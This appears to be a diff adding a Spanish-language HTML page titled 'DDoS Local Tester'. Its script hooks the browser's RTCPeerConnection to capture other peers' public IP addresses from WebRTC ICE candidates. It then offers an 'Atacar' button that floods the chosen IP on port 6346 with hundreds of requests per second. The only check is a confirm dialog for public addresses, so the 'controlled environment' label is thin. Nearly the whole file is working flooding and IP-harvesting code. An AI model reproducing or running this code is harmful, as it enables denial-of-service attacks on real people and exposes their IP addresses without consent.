@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Local Tester - Entorno Controlado</title>
+</head>
+<body>
+    <!-- El script se inyectará aquí al abrir el HTML -->
+    <script>
+        (function () {
+            // --- Eliminar panel previo ---
+            const existingPanel = document.getElementById('ip-container');
+            if (existingPanel) existingPanel.remove();
+
+            // ============================================================
+            // 1. ESTILOS (igual que la versión final)
+            // ============================================================
+            const style = document.createElement('style');
+            style.textContent = `
+                :root { --bg: #011522; --bg2: #0a1a2b; --bg3: #0d1f30; --border: #1a2a3a; --border2: #2a3a4a; --text: #e8e8ec; --text2: #8a8a96; --text3: #55555f; --green: #22c55e; --green-dim: rgba(34,197,94,.12); --yellow: #f59e0b; --yellow-dim: rgba(245,158,11,.10); --red: #ef4444; --red-dim: rgba(239,68,68,.10); --radius: 8px; }
+                #ip-container { position: fixed; top: 20px; right: 20px; width: 420px; max-height: 640px; background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: 0 24px 64px rgba(0,0,0,.7); font-family: system-ui, sans-serif; font-size: 13px; color: var(--text); z-index: 2147483647; display: flex; flex-direction: column; overflow: hidden; }
+                #drag-handle { display: flex; align-items: center; padding: 12px 14px; background: var(--bg); border-bottom: 1px solid var(--border); cursor: move; user-select: none; flex-shrink: 0; gap: 8px; }
+                .tools { display: flex; align-items: center; gap: 6px; }
+                .box { display: inline-block; width: 13px; height: 13px; border-radius: 50%; cursor: pointer; border: none; }
+                .box.red { background-color: #ff605c; }
+                .box.yellow { background-color: #ffbd44; }
+                .box.green { background-color: #00ca4e; }
+                #ipc-title { flex: 1; text-align: center; font-weight: 600; font-size: 12.5px; }
+                #ipc-count { background: var(--green-dim); color: var(--green); font-size: 10.5px; font-weight: 600; padding: 2px 8px; border-radius: 20px; border: 1px solid rgba(34,197,94,.2); min-width: 36px; text-align: center; }
+                #ip-addresses { overflow-y: auto; flex: 1; padding: 10px; display: flex; flex-direction: column; gap: 6px; background: var(--bg); max-height: 400px; }
+                #ip-addresses::-webkit-scrollbar { width: 3px; }
+                #ip-addresses::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 4px; }
+                .ip-item { background: var(--bg2); border: 1px solid var(--border); border-radius: 11px; padding: 12px 13px; display: flex; flex-direction: column; gap: 8px; animation: ipc-in .2s ease; }
+                @keyframes ipc-in { from { opacity:0; transform:translateY(-4px); } to { opacity:1; transform:translateY(0); } }
+                .ipc-ip { font-family: monospace; font-size: 14.5px; font-weight: 500; color: #4ade80; }
+                .ipc-time { font-size: 10.5px; color: var(--text3); font-family: monospace; }
+                .ipc-card-top { display: flex; justify-content: space-between; align-items: center; }
+                .ipc-tags { display: flex; flex-wrap: wrap; gap: 5px; }
+                .ipc-tag { background: var(--bg3); border: 1px solid var(--border2); border-radius: 6px; padding: 2px 8px; font-size: 11px; color: var(--text2); }
+                .ipc-tag.public { border-color: rgba(239,68,68,.3); color: #f87171; }
+                .ipc-tag.private { border-color: rgba(34,197,94,.3); color: #4ade80; }
+                .btn-attack { background: var(--red-dim); border: 1px solid rgba(239,68,68,.3); color: #f87171; border-radius: 7px; padding: 6px 14px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all .2s; font-family: monospace; margin-left: auto; white-space: nowrap; }
+                .btn-attack:hover { background: #ef4444; color: #fff; border-color: #ef4444; }
+                .btn-attack.active { background: #22c55e; border-color: #22c55e; color: #fff; animation: pulse 0.5s infinite alternate; }
+                @keyframes pulse { from { box-shadow: 0 0 5px rgba(34,197,94,.2); } to { box-shadow: 0 0 25px rgba(34,197,94,.6); } }
+                .ipc-card-footer { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+                .ipc-copy { background: var(--bg3); border: 1px solid var(--border2); border-radius: 7px; padding: 4px 12px; font-size: 11px; color: var(--text2); cursor: pointer; }
+                .ipc-copy:hover { background: var(--text); color: var(--bg); }
+                .ipc-status { font-size: 10px; color: var(--text3); flex: 1; }
+                .manual-add-bar { display: flex; gap: 6px; padding: 8px 10px; background: var(--bg3); border-bottom: 1px solid var(--border); flex-shrink: 0; }
+                .manual-add-bar input { flex: 1; background: var(--bg); border: 1px solid var(--border2); color: var(--text); border-radius: 4px; padding: 4px 8px; font-size: 12px; font-family: monospace; outline: none; }
+                .manual-add-bar input:focus { border-color: var(--green); }
+                .manual-add-bar button { background: var(--green); color: #000; border: none; border-radius: 4px; padding: 4px 12px; font-weight: 700; font-size: 12px; cursor: pointer; transition: .2s; white-space: nowrap; }
+                .manual-add-bar button:hover { opacity: .8; transform: scale(1.02); }
+            `;
+            document.head.appendChild(style);
+
+            // ============================================================
+            // 2. ESTRUCTURA DEL PANEL
+            // ============================================================
+            const panel = document.createElement('div');
+            panel.id = 'ip-container';
+            panel.innerHTML = `
+                <div id="drag-handle">
+                    <div class="tools">
+                        <div class="circle"><span class="box red" id="ipc-btn-close" title="Cerrar"></span></div>
+                        <div class="circle"><span class="box yellow" id="ipc-btn-clear" title="Limpiar"></span></div>
+                        <div class="circle"><span class="box green" id="ipc-btn-minimize" title="Minimizar"></span></div>
+                    </div>
+                    <div id="ipc-title">⚔️ DDoS Local Tester</div>
+                    <span id="ipc-count">0 IP</span>
+                </div>
+                <div class="manual-add-bar">
+                    <input type="text" id="manual-ip-input" placeholder="Ej: 127.0.0.1 (o IP local)" value="127.0.0.1">
+                    <button id="manual-ip-btn">➕ Agregar</button>
+                </div>
+                <div id="ip-addresses">
+                    <div style="text-align:center;padding:40px;color:#555;">🔄 Agrega una IP manual o espera detección WebRTC</div>
+                </div>
+            `;
+            document.body.appendChild(panel);
+
+            // --- Botones de control ---
+            document.getElementById('ipc-btn-close').addEventListener('click', () => {
+                if (window._attackIntervals) window._attackIntervals.forEach(clearInterval);
+                panel.remove();
+            });
+            document.getElementById('ipc-btn-clear').addEventListener('click', () => {
+                seenIPs.clear();
+                if (window._attackIntervals) window._attackIntervals.forEach(clearInterval);
+                window._attackIntervals = [];
+                document.getElementById('ipc-count').textContent = '0 IP';
+                document.getElementById('ip-addresses').innerHTML = `<div style="text-align:center;padding:40px;color:#555;">🔄 Agrega una IP manual o espera detección WebRTC</div>`;
+            });
+            document.getElementById('ipc-btn-minimize').addEventListener('click', () => {
+                panel.style.opacity = '0.15';
+                setTimeout(() => panel.style.opacity = '1', 600);
+            });
+
+            // ============================================================
+            // 3. LÓGICA DE ATAQUE
+            // ============================================================
+            const seenIPs = new Map();
+            let attackIntervals = [];
+
+            function esIPPrivada(ip) {
+                return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip);
+            }
+
+            function iniciarAtaque(ipDetectada, btnElement) {
+                const PUERTO = 6346;
+                const TARGET_URL = `http://${ipDetectada}:${PUERTO}`;
+
+                if (!esIPPrivada(ipDetectada)) {
+                    const confirmar = confirm(
+                        `⚠️ ¡ATENCIÓN! IP PÚBLICA: ${ipDetectada}\n\n` +
+                        `Estás a punto de atacar una IP que NO es local.\n` +
+                        `Esto solo debe hacerse en ENTORNOS CONTROLADOS.\n` +
+                        `¿Estás ABSOLUTAMENTE SEGURO?`
+                    );
+                    if (!confirmar) {
+                        btnElement.textContent = '🚫 Cancelado';
+                        setTimeout(() => btnElement.textContent = '🔥 Atacar', 1500);
+                        return;
+                    }
+                }
+
+                if (btnElement.classList.contains('active')) {
+                    detenerAtaque(btnElement);
+                    return;
+                }
+
+                let peticiones = 0;
+                btnElement.textContent = `⏳ 0 req`;
+                btnElement.classList.add('active');
+                console.log(`🔥 [ATAQUE] Iniciando contra: ${TARGET_URL}`);
+
+                const interval = setInterval(() => {
+                    for (let i = 0; i < 100; i++) {
+                        fetch(TARGET_URL, {
+                            method: 'GET',
+                            cache: 'no-store',
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                        peticiones++;
+                    }
+                    if (peticiones % 500 < 100) {
+                        btnElement.textContent = `⚡ ${peticiones} req`;
+                    }
+                }, 50);
+
+                btnElement._attackInterval = interval;
+                attackIntervals.push(interval);
+                window._attackIntervals = attackIntervals;
+            }
+
+            function detenerAtaque(btnElement) {
+                if (btnElement._attackInterval) {
+                    clearInterval(btnElement._attackInterval);
+                    btnElement._attackInterval = null;
+                }
+                btnElement.textContent = '🔥 Atacar';
+                btnElement.classList.remove('active');
+            }
+
+            // ============================================================
+            // 4. CREACIÓN DE TARJETAS
+            // ============================================================
+            function upsertCard(ip) {
+                const list = document.getElementById('ip-addresses');
+                const time = new Date().toLocaleTimeString();
+
+                if (seenIPs.has(ip)) {
+                    const card = seenIPs.get(ip);
+                    card.querySelector('.ipc-time').textContent = time;
+                    list.prepend(card);
+                    return;
+                }
+
+                const empty = list.querySelector('div[style]');
+                if (empty) empty.remove();
+
+                let count = parseInt(document.getElementById('ipc-count').textContent) || 0;
+                count++;
+                document.getElementById('ipc-count').textContent = `${count} IP`;
+
+                const isPrivate = esIPPrivada(ip);
+                const tagClass = isPrivate ? 'private' : 'public';
+                const tagText = isPrivate ? '🏠 Privada' : '🌍 Pública';
+
+                const card = document.createElement('div');
+                card.className = 'ip-item';
+                card.innerHTML = `
+                    <div class="ipc-card-top">
+                        <span class="ipc-ip">${ip}</span>
+                        <span class="ipc-time">${time}</span>
+                    </div>
+                    <div class="ipc-tags">
+                        <span class="ipc-tag ${tagClass}">${tagText}</span>
+                        <span class="ipc-tag">🎯 Puerto: 6346</span>
+                    </div>
+                    <div class="ipc-card-footer">
+                        <span class="ipc-status" id="status-${ip.replace(/\./g,'-')}">✅ Listo</span>
+                        <button class="ipc-copy">📋 Copiar</button>
+                        <button class="btn-attack">🔥 Atacar</button>
+                    </div>
+                `;
+
+                card.querySelector('.ipc-copy').addEventListener('click', () => {
+                    navigator.clipboard.writeText(ip).then(() => {
+                        const btn = card.querySelector('.ipc-copy');
+                        btn.textContent = '✅ Copiado';
+                        setTimeout(() => btn.textContent = '📋 Copiar', 1500);
+                    });
+                });
+
+                const attackBtn = card.querySelector('.btn-attack');
+                attackBtn.addEventListener('click', () => {
+                    iniciarAtaque(ip, attackBtn);
+                });
+
+                seenIPs.set(ip, card);
+                list.prepend(card);
+            }
+
+            // ============================================================
+            // 5. AGREGADOR MANUAL
+            // ============================================================
+            document.getElementById('manual-ip-btn').addEventListener('click', () => {
+                const input = document.getElementById('manual-ip-input');
+                const ip = input.value.trim();
+                if (!ip) return alert('Escribe una IP válida');
+                if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
+                    return alert('Formato de IP inválido (ej: 192.168.1.10)');
+                }
+                upsertCard(ip);
+                input.value = '';
+            });
+
+            document.getElementById('manual-ip-input').addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') document.getElementById('manual-ip-btn').click();
+            });
+
+            // ============================================================
+            // 6. HOOK DE WEBRTC (Detección automática)
+            // ============================================================
+            window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
+
+            window.RTCPeerConnection = function (...args) {
+                const pc = new window.oRTCPeerConnection(...args);
+                pc.oaddIceCandidate = pc.addIceCandidate;
+
+                pc.addIceCandidate = function (iceCandidate, ...rest) {
+                    try {
+                        const raw = iceCandidate && iceCandidate.candidate ? iceCandidate.candidate : '';
+                        if (raw) {
+                            const parts = raw.split(' ');
+                            const ip = parts[4] || '';
+                            const type = parts[7] || '';
+                            if ((type === 'srflx' || type === 'prflx') && ip) {
+                                upsertCard(ip);
+                            }
+                        }
+                    } catch (_) {}
+                    return pc.oaddIceCandidate(iceCandidate, ...rest);
+                };
+                return pc;
+            };
+            window.RTCPeerConnection.prototype = window.oRTCPeerConnection.prototype;
+
+            console.log('✅ Panel cargado. Agrega manualmente 127.0.0.1 o espera detección.');
+            console.log('⚠️ Ataques dirigidos al puerto 6346 de la IP que elijas.');
+        })();
+    </script>
+</body>
+</html>
